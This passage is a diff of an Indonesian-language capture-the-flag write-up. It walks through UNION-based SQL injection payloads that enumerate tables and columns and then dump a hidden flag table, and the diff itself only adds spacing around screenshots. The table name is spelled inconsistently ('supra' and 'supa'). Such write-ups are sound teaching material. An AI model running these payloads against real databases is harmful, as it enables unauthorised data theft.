@@ -25,18 +25,23 @@ Dari hal tersebut dapat kita asumsikan bahwa website tersebut rentan terhadap SQ
 " and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = database() -- -
 ```
 Maka didapatkan hasil sebagai berikut.
+
 ![image](Images/3_getdb.PNG)
+
 Dimana didalam hasil tersebut terdapat 2 tabel yaitu ```members``` dan ```supra_secret_table``` yang mana selanjutnya dilakukan dump pada tabel ```supra_secret_table``` dengan menggunakan payload sebagai berikut.
 ```
 " and 1=2 union select group_concat(column_name),3,4 from information_schema.columns where table_schema = database() and table_name = "supa_secret_table" -- -
 ```
 Didapatkan hasil yaitu terdapat dua kolom id dan flag.
+
 ![image](Images/3_getcolumn.PNG)
+
 Kemudian dari kolom tersebut kita lihat isinya dengan menggunakan query sebagai berikut.
 ```
 " and 1=2 union select group_concat(id,flag),3,4 from supa_secret_table -- - -- -
 ```
 Dan didapatkan flag dari soal.
+
 ![image](Images/4_flag.PNG)
 ## Flag
 
